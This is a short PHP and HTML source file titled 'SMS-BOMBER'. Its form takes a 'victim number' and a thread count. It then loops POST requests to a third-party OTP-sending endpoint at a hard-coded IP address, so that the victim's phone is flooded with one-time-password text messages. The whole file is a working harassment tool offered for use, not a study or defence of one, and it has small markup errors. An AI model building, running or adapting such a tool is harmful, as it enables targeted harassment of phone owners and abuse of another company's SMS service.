<!DOCTYPE html>
<html>
  <head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS-BOMBER</title>
    <link rel="stylesheet" href="style.css">
      
    </style>
  </head>
  <body>
<form align = "center" method="POST">
  
<label class="custom-field one">
  <input type="number" name="number" placeholder=" "/>
  <span class="placeholder">ENTER VICTIM NUMBER</span>
</label>
<br><br>
<label class="custom-field one">
  <input type="number" name= "amount" placeholder=" "/>
  <span class="placeholder">ENTER THREAD AMOUNT</span>
</label>
<button name="submit" class="custom-btn btn-1">START</button>

 </from>
 
  </body>
</html>

<?php
if(isset($_POST['submit'])){
	$number = $_POST['number'];
	$amount = $_POST['amount'];
	if($amount > 20 or $amount < 0){
	echo '<script type="text/javascript">';
	echo ' alert("Max Limit Reached !")';
	echo '</script>';
	}else{
		for($i=0; $i < $amount; $i++){

$url = "http://45.114.85.19:8080/v3/otp/send?";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "Content-Type: application/x-www-form-urlencoded",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = "msisdn=88".$number;

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
$resp = curl_exec($curl);
curl_close($curl);


	}
	}
	}
?>
